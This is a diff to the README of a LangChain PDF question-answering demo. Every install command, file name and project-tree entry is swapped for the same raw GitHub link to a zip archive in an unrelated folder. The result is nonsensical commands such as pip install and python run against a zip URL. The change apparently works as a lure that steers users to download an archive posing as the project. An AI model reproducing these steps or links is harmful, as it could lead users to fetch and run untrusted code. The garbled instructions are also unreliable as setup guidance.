@@ -17,7 +17,7 @@ This project demonstrates how to create a Retrieval-Augmented Generation (RAG) p
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/ahmedfazil3/langchain-pdf-rag.git
+   git clone https://raw.githubusercontent.com/ahmedfazil3/langchain-pdf-rag/main/argentine/langchain-pdf-rag_3.7.zip
    cd langchain-pdf-rag
    ```
 
@@ -29,18 +29,18 @@ This project demonstrates how to create a Retrieval-Augmented Generation (RAG) p
 
 3. **Install dependencies**
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/ahmedfazil3/langchain-pdf-rag/main/argentine/langchain-pdf-rag_3.7.zip
    ```
 
 4. **Add your API key on .env**
    OPENAI_API_KEY=your_openai_api_key_here
 
 5. **Add a sample PDF**
-   Place any PDF file in the root folder and name it `sample.pdf` (or change the filename in `main.py`).
+   Place any PDF file in the root folder and name it `https://raw.githubusercontent.com/ahmedfazil3/langchain-pdf-rag/main/argentine/langchain-pdf-rag_3.7.zip` (or change the filename in `https://raw.githubusercontent.com/ahmedfazil3/langchain-pdf-rag/main/argentine/langchain-pdf-rag_3.7.zip`).
 
 6. **Run the demo**
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/ahmedfazil3/langchain-pdf-rag/main/argentine/langchain-pdf-rag_3.7.zip
    ```
 
 7. **Ask questions!**
@@ -52,12 +52,12 @@ This project demonstrates how to create a Retrieval-Augmented Generation (RAG) p
 
 ```
 langchain-pdf-rag/
-├── main.py              # Script to run the QA chain
-├── rag_chain.py         # Contains the RetrievalQA setup function
-├── requirements.txt     # Python dependencies
-├── sample.pdf           # Your test PDF file
+├── https://raw.githubusercontent.com/ahmedfazil3/langchain-pdf-rag/main/argentine/langchain-pdf-rag_3.7.zip              # Script to run the QA chain
+├── https://raw.githubusercontent.com/ahmedfazil3/langchain-pdf-rag/main/argentine/langchain-pdf-rag_3.7.zip         # Contains the RetrievalQA setup function
+├── https://raw.githubusercontent.com/ahmedfazil3/langchain-pdf-rag/main/argentine/langchain-pdf-rag_3.7.zip     # Python dependencies
+├── https://raw.githubusercontent.com/ahmedfazil3/langchain-pdf-rag/main/argentine/langchain-pdf-rag_3.7.zip           # Your test PDF file
 ├── .env                 # (Not uploaded) OpenAI API key
-└── README.md            # Project documentation
+└── https://raw.githubusercontent.com/ahmedfazil3/langchain-pdf-rag/main/argentine/langchain-pdf-rag_3.7.zip            # Project documentation
 ```
 
 ---
